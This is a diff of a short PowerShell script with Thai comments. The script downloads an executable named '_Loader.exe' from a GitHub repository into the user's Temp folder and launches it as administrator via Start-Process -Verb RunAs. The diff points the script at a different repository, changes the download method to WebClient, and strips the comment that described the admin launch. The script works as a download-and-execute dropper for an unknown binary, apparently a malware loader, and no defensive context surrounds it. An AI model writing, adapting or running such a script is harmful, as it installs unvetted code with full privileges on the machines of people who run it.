@@ -1,22 +1,22 @@
-# 1. ตั้งค่าตำแหน่งดาวน์โหลด (เก็บไว้ในโฟลเดอร์ Temp ของเครื่อง)
-$exeUrl = "https://github.com/Reflexeiei885/ranvyx/raw/main/_Loader.exe"
+# แก้บรรทัดที่ 2 ให้เป็นชื่อนี้:
+$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
 $outputPath = "$env:TEMP\_Loader.exe"
 
-# 2. เริ่มการดาวน์โหลด
+# ส่วนที่เหลือเหมือนเดิม...
 Write-Host "Connecting to Server..." -ForegroundColor Cyan
 try {
-    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -ErrorAction Stop
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($exeUrl, $outputPath)
 } catch {
-    Write-Host "ดาวน์โหลดไม่สำเร็จ! กรุณาเช็คอินเทอร์เน็ตหรือลิงก์ไฟล์" -ForegroundColor Red
+    Write-Host "Download Failed!" -ForegroundColor Red
     pause
     exit
 }
 
-# 3. รันไฟล์ EXE และเด้งเข้าหน้า CMD (ในฐานะ Admin)
 if (Test-Path $outputPath) {
     Write-Host "Starting Loader..." -ForegroundColor Green
     Start-Process -FilePath $outputPath -Verb RunAs
 } else {
-    Write-Host "ไม่พบไฟล์ในเครื่อง!" -ForegroundColor Red
+    Write-Host "File not found!" -ForegroundColor Red
     pause
 }
